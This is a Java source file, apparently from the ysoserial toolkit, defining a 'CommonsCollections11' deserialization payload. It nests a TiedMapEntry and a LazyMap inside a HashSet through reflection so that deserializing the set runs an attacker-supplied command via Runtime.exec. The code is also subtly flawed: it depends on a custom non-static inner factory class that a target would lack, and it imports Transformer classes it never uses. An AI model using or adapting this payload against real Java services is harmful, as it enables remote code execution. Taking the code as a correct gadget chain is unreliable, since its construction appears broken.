package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<Serializable> {
    @Override
    public Serializable getObject(String command) throws Exception {
        final String[] execArgs = new String[]{command};


        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, new NewFactory(execArgs));

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;
    }

    public class NewFactory implements Factory, Serializable {
        private final String[] execArgs;

        public NewFactory(String[] execArgs) {
            this.execArgs = execArgs;
        }

        @Override
        public Object create() {
            System.out.println(execArgs);
            try {
                Runtime.getRuntime().exec(execArgs);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            return null;
        }
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections11.class, args);

    }
}
